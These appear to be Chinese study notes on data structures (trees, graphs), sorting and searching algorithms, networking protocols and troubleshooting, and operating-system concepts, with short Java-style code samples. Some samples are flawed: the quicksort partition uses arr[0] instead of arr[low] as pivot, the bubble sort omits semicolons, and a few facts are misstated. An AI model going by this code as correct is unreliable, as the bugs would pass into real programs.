叶子节点（Leaf）：没有子节点的节点，位于树的底层。
内部节点（Internal Node）：既有父节点又有子节点的节点。
树高度(深度)：指从某个节点到其最远叶子节点的最长路径上的边数。如果从根节点开始计算，则称为整棵树的高度

***特点***
**非线性结构**：数据元素之间不再是线性的一对一关系，而是一对多（父节点到子节点）或多对一（子节点到父节点）关系。
**递归定义**：树由子树构成，每个子树本身也是一棵树，天然适合递归算法。
**层次性**：点按层次组织，根节点为第1层，子节点逐层向下扩展。
**唯一路径**：任意两个节点之间有且仅有一条路径。

***二叉树***（Binary Tree）是树形结构的一种，每个节点最多有两个子节点，通常称为左子节点和右子节点。其定义具有递归性：
空二叉树：无任何节点的树。
非空二叉树：由一个根节点及两棵互不相交的子树（左子树、右子树）组成，且子树本身也是二叉树。


***二叉搜索树***（Binary Search Tree, BST）是一种特殊的二叉树，满足以下性质：
有序性：对于任意节点：
左子树中所有节点的值 < 当前节点的值。
右子树中所有节点的值 > 当前节点的值。
递归定义：左子树和右子树本身也是二叉搜索树。
高效查找：平均时间复杂度 O(logn)，最坏情况（退化为链表）为 O(n)。

***平衡树（Balanced Tree）定义***：
是一种自平衡的二叉搜索树（BST），通过自动调整结构，确保左右子树的高度差不超过常数（如1或2），从而保持树的高度在对数级别。这种设计避免了普通二叉搜索树在极端情况下退化为链表的性能问题，保证了高效的查询、插入和删除操作。

***平衡树种类：***
1. AVL树：通过左旋、右旋、左右旋、右左旋调整树结构，确保每个节点的左右子树高度差 ≤1。
   左旋：右子树过高时，将右子节点提升为父节点，原父节点降为左子节点。
   右旋：左子树过高时，将左子节点提升为父节点，原父节点降为右子节点（代码逻辑与左旋对称）。
2. 红黑树：通过颜色标记（红/黑）和旋转维持平衡，确保树高 ≤2log(n)。
   颜色翻转：若一个节点的两个子节点均为红色，将其设为红色，子节点设为黑色。
3. B树/B+树：  通过分裂和合并节点维持多叉树的平衡。
分裂操作：节点键值数达上限时，分裂为两个节点，中间键提升至父节点。
合并操作：节点键值数过低时，与兄弟节点合并，父节点键下移。

***高级数据结构-AVL树***
AVL树是自平衡二叉搜索树，由两位苏联数学家Adelson-Velsky和Landis于1962年提出，并以他们的姓氏首字母命名。
在AVL树中任何节点的两个子树的高度差(平衡因子，简称BF)为1，所以它也被称为高度平衡树。增加和删除可能需要通过一次或多次树旋转来重新平衡这个树。

![高级数据结构-AVL树](/images/szkingdom/szbackend-avl.png)

### 高级数据结构-红黑树
红黑树是一种二叉搜索树，其中每个节点带有颜色标记（红或黑），并通过规则确保树的高度不超过 2log(n)，从某个节点出发确保没有一条路径会比其他路径长出两倍，达到一种相对平衡的状态。
这种结构确保了树的高度保持在对数级别，从而保证了高效的查询、插入和删除操作。 (AVL树高度差不超过1，为保持平衡需要频繁翻转)。

颜色标记：每个节点是红色或黑色。
根节点黑色：根节点必须是黑色。
叶子节点黑色：所有叶子节点（NULL节点）都是黑色。
红色节点限制：任何两个连续的红色节点不能有直接的父子关系。
黑高平衡：从任何节点到其每个叶子的所有路径上，黑色节点的数量相同。

![级数据结构-红黑树](/images/szkingdom/szbackend4.png)

### 高级数据结构-B树
B 树（B-Tree）是一种自平衡的多路搜索树，设计目标是高效管理存储在磁盘或其他直接存取辅助设备上的数据
**结构特性:**
多路平衡：每个节点可以有多个子节点（称为阶数 m），减少了树的高度。
节点结构：每个节点包含多个键和指向子节点的指针，键按升序排列。
叶子节点同层：所有叶子节点位于同一层，保证最坏情况下的操作时间复杂度为 O (log n)。

![高级数据结构-B树](/images/szkingdom/szbackend-BTree.png)

### 高级数据结构-B+树
B+树其实和B树是非常相似的，是对B树的进一步优化。B+树索引是B+树在数据库中的一种实现，是最常见也是数据库中使用最为频繁的一种索引。
B+Tree是在B-Tree基础上的一种优化，使其更适合实现外存储索引结构。

![高级数据结构-B+树](/images/szkingdom/szbackend-BTree2.png)

### 高级数据结构-树的对比
| 数据结构  | 节点度数        |  平衡条件  |  数据存储位置             |  主要优点              | 主要缺点                |  典型应用  | 
| -------     |  ------   | --------  |  ------------  | --------- | -------- | --------  |
|  二叉搜索树  | 每个节点≤2   |  无      |  所有节点  |  实现简单、有序性         |   极端情况退化为链表              | 小规模数据查找 |
|  AVL树      |  每个节点≤2  |  任意节点左右子树高度差≤1 |  所有节点  |  严格平衡、查询高效   |   插入/删除代价高、实现复杂   | 需要严格平衡的场景 |
|  红黑树     |  每个节点≤2  |  弱平衡(路径黑色节点数相同)  |  所有节点  |  插入/删除高效、弱平衡   |  查询路径略长、规则复杂    | Java、TreeMap、C++、STL |
|  B树       | 每个节点≥2   |  所有叶子在同一层  | 非叶子和叶子节点   |  多路存储磁盘友好   |  空间利用率低、实现复杂    | 文件系统、数据库索引 |
|  B+树      | 每个节点≥2   | 所有叶子在同一层   |  仅叶子节点(非叶子为索引)  |  范围查询优化、磁盘读写减少   |   插入/删除复杂、空间碎片   | MySQL索引、文件系统(NTFS) |

### 高级数据结构-图
图（Graph）是一种非线性数据结构，用于表示对象（称为顶点，Vertex）及其之间的关系（称为边，Edge）。
图可以是有向的（边有方向）或无向的（边无方向），边可以带有权重（表示关系的强度或距离），也可以不带权重。

顶点：代表实体，可以是任意对象（如人、城市、设备等）。
边：表示顶点之间的关系，可以是无向的（如朋友关系）或有向的（如关注关系）。
无向图：边没有方向，如社交网络中的好友关系。
有向图：边有方向，如网页之间的链接关系。

![高级数据结构-图](/images/szkingdom/szbackend-tu1.png)
![高级数据结构-图](/images/szkingdom/szbackend-tu2.png)
![高级数据结构-图](/images/szkingdom/szbackend-tu3.png)

数据结构中对于稀疏图的定义为：有很少条边或弧（边的条数|E|远小于|V|²）的图称为稀疏图（sparse graph），反之边的条数|E|接近|V|²，称为稠密图（dense graph）。

### 高级数据结构-邻接矩阵
图的存储方式：邻接矩阵、邻接表、十字链表
邻接矩阵：用二维数组来存储任意两点之间的关系
（1）0:表示两点之间没有边；
（2）1：表示两点之间有边；
（3）权值：表示两点之间边的权值；

邻接矩阵代码示意
适用与稠密图，用于定义表示稀疏图比较浪费空间，因为大部分顶点不存在直连关系，但在数组还是要存储一个“0”

### 高级数据结构-邻接表
邻接表：邻接矩阵存在空间浪费的问题，采用链表形式存储：
（1）一个数组存储所有点；
（2）每个点元素作为单链表表头，并指向与表头相邻的点元素；

邻接表：邻接矩阵存在空间浪费的问题，尤其是稀疏图浪费空间更大，采用链表形式存储：
（1）一个数组存储所有点；
（2）每个点元素作为单链表表头，并指向与表头相邻的点元素；不相邻的点无需存储关系，减少空间。

### 高级数据结构-逆邻接表
逆邻接表：与邻接表是逆的关系，逆体现在入度和出度上。邻接表计算出度容易，计算入度难，而逆邻接表刚好相反，计算入度容易。

数据结构：与邻接表定义相似，但邻接表存储出边，逆邻接表存储入边。
构建逻辑：添加边时，邻接表将边插入源顶点的链表，逆邻接表将边插入目标顶点的链表。

### 高级数据结构-十字链表
十字链表：邻接表与逆邻接表的结合体，
每个点的边通过双向链表存储，同时记录了边的出度和入度，查询入边和出边性能都很高，
1）合并逆邻接表与邻接表
如下图我们之间把逆邻接表和邻接表拼接到一起，得到一个伪十字链表
**存在重复存储的问题**
![高级数据结构-十字链表](/images/szkingdom/szbackend-biao1.png)

2）链表由存点改存边
链表由原来存储点元素变为存储边元素。
原来点A出度链表存储点B和点C，现在改为存储[A->B]边和[A->C]边。
原来点B入度链表存储点A，现在改为存储[A->B]边。


（3）删除重复元素
比如前面链表中有两个[A->B]边，需要删除其中一个。
重新定义数组元素结构：
数据域|入边头节点指针|出边头节点指针；
链表节点元素结构：
边起点下标|边终点下标|下一个入边节点指针域|下一个出边节点指针域；

如右图红色实线箭头表示出度链表，而彩色虚线
箭头表示入度链表。点A为终点的边不存在，
点A为起点的边为 [A->B]边和[A->C]边；
点B为终点的边为[A->B]边（即红色1号虚线），
点B为起点的边为 [B->E]边；
点C为终点的边为[A->C]边（即绿色2号虚线）
和[E->C]边（即绿色3号虚线）,
点C为起点的边为[C->D]边；


| 场景                | 邻接矩阵       | 邻接表           | 逆邻接表 |  十字链表 |
| 稠密图(边数接近 V^2) | (空间利用率高) | (空间浪费)      | (空间浪费) | (实现复杂) |
| 稀疏图(边数远小于 v^2) | (空间浪费) | (空间效率高)      | (空间效率高) | (空间效率高) |
| 频繁查询边(uv) | (O(1))            | (O(degree))       | (O(degree))  | (O(degree))  |
| 频繁遍历出边 | (O(V))               | (O(degree))      | (O(E))      | (O(degree))  |
| 频繁遍历入边 | (O(V))              | (O(E))             |  (O(degree))  | (O(degree))  |
| 频繁添加/删除边 | (O(1))            | (需遍历链表)      | (需遍历链表)  | (O(1)，双向指针) |
| 网络流算法(如最大流) | (反向边操作低效) | (需额外维护反向边) | (需额外维护出边) | (天然支持双向边) |

### 排序算法-冒泡排序
将被排序的记录数组R[1..n]垂直排列，每个记录R看作是重量为R.key的气泡。根据轻气泡不能在重气泡之下的原则，从下往上扫描数组R：凡扫描到违反该原则的轻气泡，就使其向上飘浮。如此反复进行，直到最后任何两个气泡都是轻者在上，重者在下为止。
时间复杂度高，为O(n²)，不适用于大规模数据。
```java
void bubbleSort(int arr[], int n){
  for(int i=0;i<n-1;i++){ // 外层循环:控制遍历轮数
    for(int j=0; j<n-i-1; j++){  // 内层循环：比较相邻元素
      if(arr[j]> arr[j+1]){  // 若顺序错误，则交换
        int temp = arr[j]
        arr[j] = arr[j+1]
        arr[j+1] =temp
      }
    }
  }
}
```

### 排序算法-快速排序
快速排序（Quicksort）是一种高效的排序算法，采用分治策略。其基本原理是：
选择基准元素：从数组中选择一个元素作为基准（Pivot）。
分区操作：将数组分为两个子数组，使得一个子数组的所有元素都小于基准元素，另一个子数组的所有元素都大于基准元素。
递归排序：对两个子数组递归地执行上述步骤，直到子数组的长度为1或0。
平均时间复杂度：为O(nlogn) 。 
```java
// 快速排序递归函数  
void quickSort(int arr[], int low, int high) {  
    if (low < high) {  
        int pi = partition(arr, low, high); //分区 
        quickSort(arr, low, pi - 1);   //递归左边序列
        quickSort(arr, pi + 1, high);  //递归右边序列
    }  
}
// 分区函数  
int partition(int arr[], int low, int high) {  
    int pivot = arr[0]; //基准值
    int i = low + 1;  
    int j = high;  
    while (true) {  
        while (i <= j && arr[i] < pivot) i++;  
        while (i <= j && arr[j] > pivot) j--;  
        if (i >= j) break;  
        swap(&arr[i], &arr[j]);  
    }  
    swap(&arr[low], &arr[j]);  
    return j;  
} 
```

### 排序算法-归并排序
归并排序（Merge Sort）是一种基于分治法的排序算法。
其核心思想是将一个数组分成两个子数组，对每个子数组进行排序，然后将排好序的子数组合并成一个最终的有序数组。
时间复杂度：为O(nlogn) 。
```java
//归并排序算法
void mergeSort(int arr[], int left, int right) {  
    if (left < right) {  
        int mid = left + (right - left) / 2;  
        mergeSort(arr, left, mid);   //左边递归分解
        mergeSort(arr, mid + 1, right);  //右边递归分解
        merge(arr, left, mid, right);  //合并
    }  
} 
//合并算法
void merge(int arr[], int left, int mid, int right){
… … } 
```

### 排序算法对比
| 特性       | 冒泡排序          | 快速排序                   | 归并排序  |
| 时间复杂度 | O(n^2)(最坏/平均) | O(nlogn)(平均) o(n^2)(最坏)| O(nlogn)(稳定) |
| 空间复杂度 |  O(1)(原地排序) | O(logn)(递归栈)  最坏 O(n)  | O(n)(额外数组) |
| 稳定性 | 稳定(相同元素顺序不变) | 不稳定                | 稳定 | 
| 适用场景 | 数据量小、基本有序  | 数据量大、随机性强    |  数据量大、要求稳定排序 |

### 搜索算法-顺序查找
顺序查找算法又称顺序搜索算法或者线性搜索算法，是所有查找算法中最基本、最简单的。
从待查找序列中的第一个元素开始，查看各个元素是否为要找的目标元素。
时间复杂度为O(n)
使用条件：顺序查找算法适用于绝大多数场景，既可以在有序序列中查找目标元素，也可以在无序序列中查找目标元素。

### 搜索算法-二分搜索
二分搜索法，也称为二分查找法或折半查找法，是一种在有序数组中查找特定元素的搜索算法。
其基本思想是，通过不断将待查找的区间分成两半，并与待查找的元素进行比较，根据比较结果调整查找区间，直到找到元素或区间被缩小至0为止。
时间复杂度为O(log n)
使用条件：二分查找要求数组必须是有序的，无论是升序还是降序。如果数组无序，则需要先进行排序操作。

### 哈希查找算法
哈希表（又称散列表）是一种基于哈希函数（Hash Function）的数据结构，通过将键值对映射到特定存储位置（数组存储）。
哈希函数:类似于数学中的一次函数，我们给它传递一个元素，它反馈给我们一个结果值，这个值就是该元素对应的索引，也就是存储到哈希表中的位置。函数可以自行定义，但要满足一些条件：
确定性：相同的键必须生成相同的哈希值。
均匀性：不同键的哈希值应均匀分布，减少冲突概率。
高效性：计算哈希值的时间应尽可能短

查找算法核心思想是：用空间换时间，通过预先计算的哈希值直接定位目标元素，平均时间复杂度为 O(1)。 

使用条件：哈希查找算法适用于大多数场景，既支持在有序序列中查找目标元素，也支持在无序序列中查找目标元素。
```java
//自定义哈希函数
int hash(int value) {
  return value % 10;
}
//创建哈希表
void creatHash(int arr[5], int hashArr[N]) {
  int i,index;
//将序列中每个元素存储到哈希表
  for (i = 0; i < 5; i++) {
  index = hash(arr[i]);
  while(hashArr[index % N] != 0) {
  index++;
  }
  hashArr[index] = arr[i];
 }
}
//实现哈希查找算法
int hash_search(int* hashArr, int value) {
  int hashAdd = hash(value); //目标元素所在的索引
  while (hashArr[hashAdd] != value) { 
  // 如果索引位置不是目标元素，则发生了碰撞
  hashAdd = (hashAdd + 1) % N; 
  // 根据线性探测法，从索引位置依次向后探测
  //如果探测位置为空，或者重新回到了探测开始的位置（即探
  //测了一圈），则查找失败
   if (hashArr[hashAdd] == 0 || hashAdd == hash(value))      
     {
      return -1;
     }
   }
   //返回目标元素所在的数组下标
    return hashAdd;
}
```

| 特性       | 顺序查找    | 二分查找 | 哈希查找 |
| ---------  | ----------- | ------- | ------ |
| 数据结构 | 无序数组/链表 | 有序数组 | 哈希表(数组+链表/树) | 
| 时间复杂度 | O(n)(平均/最坏) | O(log n) | O(1)(平均) | 
| 空间复杂度 | O(1)         | O(1)    | O(n)(存储哈希表) | 
| 适用场景 | 数据量小、无序 | 数据量大且有序 | 高频查询、动态数据 | 
| 优势 | 实现简单，无需排序 | 效率高，适合静态数据 | 效率最高，动态增删查 | 
| 局限性 | 数据量大时效率低 | 需维护有序性 | 需处理哈希冲突 | 

## 计算机网络
### 主流网络拓扑类型
***网络的连接方式***
总线型：所有设备连接到一条公共总线上，结构简单成本低，但易受干扰。
环型：设备通过点到点连接形成闭合环路，数据沿环单向传输。
网状型：设备间有多条链接路径，可靠性高，但建设和维护成本高。
星环型：星型和环型的结合，兼具两者的优点，适用于复杂网络环境。
星型：以中央节点为中心，所有设备与其连接，易于管理和故障排查。
树型：结合星型和总线型，形成层次结构，适用于大型网络。
混合型：结合多种拓扑结构，根据实际需求灵活配置网络。
总线环型：总线型和环型的结合，提供灵活的连接方式和较高的可靠性。

互联网发展历程：ARPANET 起源、TCP/IP 标准化、万维网与移动互联网的关键节点。
网络拓扑类型：总线型、星型、环型、树型、网状型、混合型、星环型、总线环型的结构特点与适用场景。
硬件设备功能：路由器、交换机、网卡、集线器、防火墙、服务器的角色与应用场景。
传输介质特性：双绞线（Cat5e/Cat6）、光纤（单模 / 多模）、无线介质（Wi-Fi 6/5G）的传输距离、速率与抗干扰能力。
网络分级与传输技术：个域网（PAN）、局域网（LAN）、广域网（WAN）的覆盖范围与技术特点；广播式与点对点网络的通信模式。

***终端系统角色（服务器/客户端）***
服务器系统：
部署企业级硬件（如多路CPU/ECC内存），运行Windows Server/Linux等网络操作系统，提供Web服务（Nginx/Apache）、数据库（MySQL/Oracle）和域控制（Active Directory）等关键业务支撑。
客户端设备：
包括PC终端、移动设备和IoT设备，通过浏览器/专用客户端软件访问网络资源，需配置IP协议栈（DHCP自动获取或静态配置）及安全认证机制（802.1X/WPA3）。
混合角色节点：
如P2P网络中的对等节点，同时具备服务提供与消费能力；边缘计算场景下的智能网关，承担本地数据处理与云端协同双重职能。

***协议与体系结构***
分层模型对比：
OSI 七层模型：物理层、数据链路层、网络层（IPv4/IPv6、ICMP、ARP）、传输层（TCP/UDP）、会话层、表示层、应用层的核心功能与典型协议。
TCP/IP 四层模型：网络接口层、网络层（IP 协议）、传输层（TCP/UDP）、应用层（HTTP/FTP/SMTP/DNS 等）的功能划分。
协议交互机制：封装 / 解封装流程、PDU（报文 / 段 / 包 / 帧 / 比特）转换、中间设备（路由器 / 交换机）的处理逻辑。
标准化差异：OSI 与 TCP/IP 在架构设计、协议实现、标准化进程上的对比。

***网络组成要素解析***
物理层组件：
包括双绞线/光纤等传输介质、交换机/路由器等网络设备，以及终端主机和服务器等实体设备，构成网络通信的物理基础架构。
协议栈体系：
涵盖TCP/IP四层模型或OSI七层模型中的各层协议，如HTTP应用层协议、TCP传输层协议和IP网络层协议，确保异构系统间的标准化通信。
软件支撑系统：
包含网络操作系统（如Cisco IOS）、网络管理软件（Wireshark）及安全套件（防火墙），提供流量控制、故障诊断和安全防护等增值功能。

***分层模式设计原理***
模块化设计思想：
分层模型通过将复杂网络功能拆分为多个独立层级（如物理层、数据链路层、网络层等），每层仅处理特定功能，降低系统耦合度。例如物理层专注比特流传输，而应用层处理用户数据格式，这种设计显著提升协议栈的可维护性和扩展性。
标准化接口规范：
每层通过严格定义的SAP（服务访问点）与相邻层交互，如网络层通过IP地址向上提供路由服务，向下调用数据链路层的MAC地址解析。这种"黑箱"交互模式使得各层协议可独立升级而不影响整体架构。
错误隔离与恢复机制：
分层设计天然具备故障隔离能力，如传输层的TCP协议通过重传机制修复网络层丢包，而应用层无需感知底层错误。这种分层容错机制大幅提升网络可靠性。

***OSI与TCP/IP模型对比***
架构差异：
OSI严格遵循7层理论模型（会话层/表示层独立），而TCP/IP将应用/表示/会话三层合并为应用层（如FTP协议同时处理编码转换和会话控制）。物理层与数据链路层在TCP/IP中被合并为网络接口层。
协议栈实现：
OSI的X.25（网络层）/ASN.1（表示层）等协议因复杂度被淘汰，而TCP/IP的IP/TCP/UDP等协议因轻量化成为事实标准。现代网络设备（如路由器）主要实现TCP/IP四层功能。
标准化进程：
ISO推动的OSI模型具有严格文档（ISO 7498），但标准化进程缓慢；而TCP/IP通过IETF的RFC文档（如RFC 791/793）快速迭代，支持IPv6/IPsec等扩展更灵活，最终赢得市场主导地位。

***网络协议***
TCP/IP协议：传输控制协议/网际协议，是互联网的核心协议，确保数据可靠传输。
HTTP协议：超文本传输协议，用于在WEB浏览器和服务器之间传输超文本数据。
SMIP协议：简单邮件传输协议，用于电子邮件的发送和接收。
DNS协议：域名系统协议，将域名转换为IP地址，方便用户访问网站。
POP3协议：邮局协议版本3，用于从邮件服务器接收电子邮件。
IMAP协议：互联网消息访问协议，支持在多个设备上同步和管理电子邮件。
FTP协议：文件传输协议，支持文件在不同主机之间的上传和下载。
SSL/TLS协议：安全套接层/传输层安全协议，保障网络通信的安全性。

***TCP/IP 模型核心协议***
IP 协议：无连接数据包传输、分片与重组机制、TTL 防环设计，解决跨网络路由与 MTU 适配问题。
UDP 协议：无连接、低延迟、无拥塞控制的特性、多播支持能力，适用于实时传输（如视频会议、DNS 查询）。
TCP 协议：
可靠性机制：序列号与确认应答、超时重传、滑动窗口流量控制。
三次握手：建立连接的流程（SYN→SYN-ACK→ACK）与安全防护（SYN Cookie）。
应用层开发：Socket 编程核心流程（创建套接字→数据收发）、RESTful API 设计原则（HTTP 方法映射、状态码、安全认证）。

***TCP可靠性机制及三次握手***
序列号与确认应答：
每个字节分配唯一序列号，接收方通过ACK确认，配合超时重传（RTO动态计算）实现99.99%的数据可靠交付。
滑动窗口流量控制：
接收方通过窗口字段通告可用缓冲区大小，发送方动态调整发送速率，避免淹没接收端，典型窗口大小从16KB到1GB不等。
三次握手过程：
SYN→SYN-ACK→ACK的RTT耗时约1.5倍网络延迟，同时协商初始序列号（ISN）和窗口参数，SYN洪泛攻击防护需配合SYN Cookie技术。

***应用层实现（Socket编程/REST API）***
Socket编程核心流程：
创建套接字（socket()）→绑定地址（bind()）→监听连接（listen()/connect()）→数据收发（send()/recv()）。阻塞/非阻塞I/O模型影响并发处理能力，epoll/kqueue等系统调用实现高效事件驱动。
RESTful API设计原则：
基于HTTP方法（GET/POST/PUT/DELETE）映射CRUD操作，状态码（如200/404）明确响应结果，HATEOAS约束通过超媒体动态导航资源。JWT和OAuth2.0保障接口认证安全。
协议解析与序列化：
HTTP报文由起始行、首部字段和消息体构成，URL编码处理特殊字符。JSON/XML作为主流数据交换格式，Protobuf和MessagePack等二进制协议提升传输效率，gRPC基于HTTP/2实现高性能RPC。

***网络性能优化***
Web 应用优化：
协议升级：HTTP/2 多路复用解决队头阻塞，TLS 1.3 减少 RTT。
资源压缩：Gzip/Brotli 压缩静态资源，WebP 图片格式与懒加载技术。
后端性能优化：
数据库连接池：动态调整连接数、泄漏检测、多租户隔离策略。
CDN 与缓存：分层缓存策略（CDN 边缘缓存、SWR 模式）、智能预热与边缘安全加固。
边缘计算：利用 Cloudflare Workers/AWS Lambda@Edge 降低回源延迟，结合 GeoDNS 实现就近访问。

***Web应用延迟优化策略***
HTTP/2协议升级：
启用HTTP/2的多路复用特性，解决HTTP/1.1的队头阻塞问题，配合TLS 1.3加密协议，显著减少RTT（往返时延）。需注意关闭不必要的HTTP/1.1兼容选项。
压缩与资源优化：
采用Gzip/Brotli压缩静态资源（如JS/CSS），通过Webpack等工具进行Tree Shaking和Code Splitting，减少传输体积。对图片使用WebP格式并设置懒加载，可降低首屏加载时间30%以上。
边缘计算部署：
利用Cloudflare Workers或AWS Lambda@Edge将动态内容处理下沉到边缘节点，减少数据回源距离。结合地理位置路由DNS（如GeoDNS），使用户访问最近的POP节点。


***网络故障分析方法***
故障分类与排查：
丢包故障：物理层线路老化、交换机端口错误、MTU 不匹配等原因，通过 ping 与 traceroute 定位断点，重点检查链路层CRC错误计数和接口丢包统计。
拥塞故障：典型特征是时延抖动和吞吐量下降，需通过流量镜像分析、QoS 策略与缓冲区溢出检查。使用ifconfig/ip命令查看overruns和dropped计数。
配置错误：IP 冲突、路由缺失、ACL 误配，对比配置基线排查。使用show running-config等设备命令验证VLAN、路由表、NAT等关键配置。
工具应用：
tcpdump：抓包策略（网卡 / 过滤条件 / 文件存储）与 BPF 语法（如过滤 SYN 包、ICMP 请求）。
Wireshark：协议解析、IO Graphs 流量统计、Expert Info 错误识别（重传率、RTT 时延）。
开源网络库（libevent）设计思想：事件驱动架构、缓冲区管理、跨平台抽象层。

***开发实践技能提升***
高性能编程：
非阻塞 IO 与多路复用：select/poll/epoll 的应用场景与文件描述符上限优化。
粘包处理：自定义协议头（长度字段）解决 TCP 粘包问题，结合 Wireshark 验证报文边界。
协议逆向与安全：
TLS 解密：通过 SSLKEYLOGFILE 解析 HTTPS 流量，处理证书信任链问题。
私有协议分析：基于特征码、流量模式推断协议结构，Python 构造测试报文验证。
**高并发架构：**
Reactor 模式：事件驱动架构（epoll/kqueue）、缓冲区管理（零拷贝技术）。
连接池与负载均衡：数据库连接池配置（最大闲置时间、一致性哈希算法）、Nginx 动态权重调整。
微服务容灾：服务注册发现（Zookeeper）、熔断降级（Hystrix）、Chaos Engineering 故障测试。

***Socket编程基础与调试要点***
TCP/UDP协议实现：
Socket变成需掌握TCP的可靠连接（三次握手、流量控制）和UDP的无连接特性，开发中需要根据场景选择协议，如实时音视频优先UDP，文件传输选择TCP，调试时需关注连接状态（`ESTABLISHED`、`TIME_WAIT`）和错误码（如`ECONNREFUSED`）。
非阻塞IO与多路复用：
使用`select`/`poll`/`epoll`实现高并发时，需注意文件描述符上限和事件触发模式（边缘触发需一次性读完数据）。调试中可通过`strace`跟踪系统调用，分析阻塞点
粘包和拆包处理：
应用层需自定义协议头（如长度字段）解决TCP粘包问题，调试时可借助Wireshark抓包验证报文边界是否正确分割。

常见网络性能问题：减少数据库交互提升性能、使用异步通讯提升性能慢、使用批量接口提升性能、使用压缩算法提升性能。

### 操作系统
核心概念：操作系统是管理硬件与软件资源的核心，具备资源管理和用户接口功能，分为批处理、分时、实时等多种类型。
Linux 起源：由 Linus Torvalds 于 1991 年发布，基于开源理念，内核版本历经多次迭代（如 2.x 支持多处理器，4.x 优化性能）。
关键组件：内核（管理硬件）、发行版（如 Ubuntu、CentOS）、文件系统（树形结构）、Shell（用户交互接口）。

***进程管理***
进程本质：是程序的运行实例，有独立的内存空间和资源。有运行、就绪、阻塞等状态，通过进程控制块（PCB）管理信息。
调度算法：涵盖先来先服务（FCFS）、短作业优先（SJF）、优先级调度、时间片轮转等，需根据场景选择合适算法。
核心命令：ps查看进程，kill终止进程，nice/renice调整优先级，优化资源分配。

***线程与并发***
线程特性：进程内的轻量级执行单元，共享进程资源，具备并发性和共享性。线程是进程内独立执行的最小单位。
并发控制：通过同步（协作顺序）、互斥（独占资源）、信号量、管程等机制避免死锁和饥饿。
应用场景：多线程编程适用于高并发场景，需注意资源竞争与线程安全。

***内存管理***
核心技术：物理内存与虚拟内存结合，通过分页 / 分段机制提升内存利用率，交换空间缓解内存压力。
内存分配：分为连续分配与非连续分配，动态分配更灵活，静态分配适用于编译时确定内存需求的场景。
虚拟内存：通过页表映射实现，LRU 等算法优化页面置换，提升多任务性能。

***文件系统***
结构与操作：文件由头、体组成（元数据、数据体），类型包括普通文件、目录文件、设备文件、管道文件等；支持创建、删除、读写、权限管理等操作。
磁盘管理：分区、调度算法（如 FCFS、SSTF）、碎片整理优化磁盘性能，挂载 / 卸载实现文件系统动态管理。
关键概念：索引节点（inode）记录文件元数据，软链接 / 硬链接灵活管理文件引用。

***输入/输出系统***
I/O 分类：字符设备（如键盘）与块设备（如磁盘），通过端口、缓冲区、DMA 等机制提升传输效率。
文件与网络 I/O：顺序 / 随机读写、套接字编程、I/O 模型（阻塞 / 非阻塞 / 多路复用）是核心知识点。
驱动开发：连接操作系统与硬件，需遵循规范开发字符设备 / 块设备驱动。

***了解网络I/O的通信过程***
网络 I/O 的核心架构: 应用层、内核协议栈、设备驱动层、物理层
内核网络 I/O 的核心组件: socket 层、协议栈层、设备驱动层
发送数据(Send)的内核流程: 应用层调用-》Socket 层处理-》协议栈封装-》设备驱动发送
接收数据(Recv)的内核流程: 硬件中断触发-》NAPI 数据收集-》协议栈解封装-》数据交付应用层

***掌握文件I/O的操作***
文件 I/O 的基本概念: 1. 同步 I/O:应用程序发起 I/O 请求后会阻塞，直到数据传输完成。 2. 异步 I/O:应用程序发起 I/O 请求后继续执行，内核在操作完成后通过回调或信号通知应用程序。
同步异步 I/O 的内核流程: 同步:read() 系统调用-》VFS 层处理-页缓存检查》块设备驱动处理-》数据拷贝与返回 ;  异步:通过 aio_read()、io_uring 等接囗支持异步I/O.
关键数据结构: VFS(虚拟文件系统)  页缓存(Page Cache)  address_space
文件I/O的性能优化: 通过调整I/O缓冲区大小、使用异步I/O等方式，提高文件I/O性能。

***操作系统安全***
安全基础：威胁包括病毒、攻击、数据泄露等，通过安全策略、漏洞扫描、审计保障系统安全。
权限管理：用户 / 用户组机制、文件权限（r/w/x）、特殊权限（SUID/SGID）控制访问。
网络防护：防火墙（如 iptables）、入侵检测（IDS）、加密技术（HTTPS/SSH）是核心手段。

***调度基础(进程调度概念)***
1. 进程调度的定义： 进程调度是指操作系统按照一定的算法，动态地将CPU分配给就绪队列中的进程，确保系统资源的有效利用。
2. 调度算法的作用： 调度算法通过合理分配CPU时间片，提高系统整体性能，保证多个进程公平且高效地执行。
3. 调度的主要算法： 先来先服务、最短作业优先、最短剩余时间优先、时间片轮转、优先级调度、多级反馈队列。
4. 调度的评价指标： CPU 利用率、吞吐量、平均等待时间、响应时间、公平性。

***虚拟机 `VMware Workstation`***

***操作系统实例***
安装流程：安装准备、软件下载、配置虚拟机、安装过程。
LInux命令：文件管理（ls/cd/mkdir/rm等，用于文件操作。）、进程管理（ps、top、kill等，用于进程查看与控制。）、包管理（apt、yum等，用于软件包的安装与卸载。）、文本编辑（vi/nano）。网络管理命令(ifconfig、ping、netstat等，用于网络管理。).
调度实战：nice/renice调整优先级。
nice命令用于启动新进程时指定其优先级，语法为"nice [选项] 命令"，选项包括-n指定优先级。
通过"ps -l"命令可查看进程的优先级信息，包括NI值（nice值），了解进程调度情况。
renice命令用于修改已运行进程的优先级，语法为"renice [优先级] [进程ID]"，可批量修改。

***了解调度命令在常见场景中的应用***
后台任务调度: 通过nice命令启动后台任务，降低其优先级，避免影响前台交互性能，提高用户体验。
交互任务优化: 使用renice提升交互任务的优先级，确保响应迅速，满足用户对即时反馈的需求。
资源密集型任务管理: 合理设置资源密集型任务的优先级，平衡系统资源分配，防止其独占CPU影响其他进程。
系统维护任务调度: 利用调度命令优化系统维护任务的执行，确保在不影响正常业务的情况下高效完成维护工作。

***调度实战技巧***(注意事项)
避免过度使用: 频繁或不恰当地使用调度命令可能导致系统不稳定，应合理评估任务优先级。
监控系统负载: 定期监控系统负载，确保调度命令的使用不会导致资源过度倾斜，影响整体性能
优先级设置的合理性: 根据任务的重要性和紧急程度合理设置优先级，避免优先级设置过高或过低
考虑系统兼容性: 在不同操作系统或版本中，调度命令的行为可能有所不同，需确认其兼容性。


***调优方法***
掌握系统性能优化手段
进程调度优化： 调整进程调度算法，提高系统响应速度。
内存管理优化： 合理配置内存参数，减少内存浪费。
I/O性能优化： 使用缓存、优化I/O调度等提升I/O效率。
文件系统优化： 选择合适的文件系统类型，优化磁盘布局。
网络性能优化： 调整网络参数，提高网络传输速度和稳定性。

***了解操作系统性能评估指标***
CPU利用率: CPU 使用率、CPU 负载(Load Average)、上下文切换(Context Switches)、中断(Interrupts)、CPU频率与温度
内存利用率： 物理内存使用、Swap 使用、内存碎片、页错误(Page Faults)。
I/O吞吐量: 磁盘使用率、I/O 吞吐量与响应时间、磁盘队列长度、文件系统性能。
网络性能指标:带宽利用率、网络延迟与丢包、TCP 连接状态、网络栈性能。
